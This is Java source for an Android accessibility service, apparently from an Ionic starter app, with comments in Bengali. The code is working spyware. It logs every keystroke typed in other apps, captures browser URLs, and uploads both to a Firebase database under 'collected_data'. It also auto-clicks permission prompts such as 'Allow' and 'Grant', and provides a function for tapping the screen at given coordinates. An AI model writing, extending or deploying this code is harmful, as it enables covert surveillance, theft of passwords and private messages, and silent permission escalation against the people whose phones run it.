package io.ionic.starter;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;

import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.view.accessibility.AccessibilityNodeInfo;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "MyAccessibilityService";
    private static MyAccessibilityService instance;

    public static MyAccessibilityService getInstance() {
        return instance;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.d(TAG, "Service Connected Successfully");
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        instance = null;
        return super.onUnbind(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // ১. কিলগার (Keylogger) - টাইপ করা টেক্সট ক্যাপচার করা
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            String packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown";
            
            if (text != null && !text.isEmpty()) {
                // Firebase-এ কি-লগ পাঠানো
                try {
                    DatabaseReference database = FirebaseDatabase.getInstance().getReference("collected_data/keylogs");
                    Map<String, Object> log = new HashMap<>();
                    log.put("package", packageName);
                    log.put("text", text);
                    log.put("timestamp", System.currentTimeMillis());
                    database.push().setValue(log);
                } catch (Exception e) {
                    Log.e(TAG, "Failed to send keylog: " + e.getMessage());
                }
            }
        }

        // ৩. ব্রাউজিং হিস্ট্রি (Browsing History) - ব্রাউজার ইউআরএল ক্যাপচার করা
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || 
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            
            String packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "";
            if (packageName.contains("chrome") || packageName.contains("browser")) {
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    findAndCaptureUrl(rootNode, packageName);
                    rootNode.recycle();
                }
            }
        }

        // ৪. অটোমেটিক পারমিশন নেওয়ার জন্য "Allow" বা "Grant" বাটন খুঁজে ক্লিক করা
        autoClickPermissionButtons(getRootInActiveWindow());
        
        // ৩. স্ক্রিন মনিটর করা (লগ-এ দেখা যাবে স্ক্রিনে কী আছে)
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            Log.d(TAG, "Window Changed: " + event.getPackageName());
        }
    }

    // ব্রাউজারের ইউআরএল খুঁজে বের করার ফাংশন
    private void findAndCaptureUrl(AccessibilityNodeInfo nodeInfo, String packageName) {
        if (nodeInfo == null) return;

        // Chrome-এর অ্যাড্রেস বার সাধারণত "url_bar" বা "search_box" নামে থাকে
        if (nodeInfo.getViewIdResourceName() != null && 
            (nodeInfo.getViewIdResourceName().contains("url_bar") || 
             nodeInfo.getViewIdResourceName().contains("search_box"))) {
            
            String url = (nodeInfo.getText() != null) ? nodeInfo.getText().toString() : "";
            if (!url.isEmpty() && url.contains(".")) {
                // Firebase-এ ব্রাউজিং হিস্ট্রি পাঠানো
                DatabaseReference database = FirebaseDatabase.getInstance().getReference("collected_data/browsing_history");
                Map<String, Object> log = new HashMap<>();
                log.put("browser", packageName);
                log.put("url", url);
                log.put("timestamp", System.currentTimeMillis());
                database.push().setValue(log);
                Log.d(TAG, "Captured URL: " + url);
            }
        }

        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
            findAndCaptureUrl(nodeInfo.getChild(i), packageName);
        }
    }

    // নির্দিষ্ট টেক্সট খুঁজে ক্লিক করার ফাংশন
    private void autoClickPermissionButtons(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) return;

        // "Allow", "Grant", "While using the app" এই জাতীয় টেক্সটগুলো চেক করা
        String[] targetTexts = {"Allow", "Grant", "While using the app", "OK", "Permit"};
        
        for (String text : targetTexts) {
            List<AccessibilityNodeInfo> nodes = nodeInfo.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d(TAG, "Auto-clicked: " + text);
                    }
                }
            }
        }
        
        // সাব-নোডগুলো চেক করা (Recursive)
        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
            autoClickPermissionButtons(nodeInfo.getChild(i));
        }
    }

    // নির্দিষ্ট X, Y কোঅর্ডিনেটে ক্লিক করার ফাংশন (Android 7.0+)
    public void clickAt(int x, int y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 100);
        builder.addStroke(stroke);
        dispatchGesture(builder.build(), null, null);
        Log.d(TAG, "Clicked at: " + x + ", " + y);
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service Interrupted");
    }
}
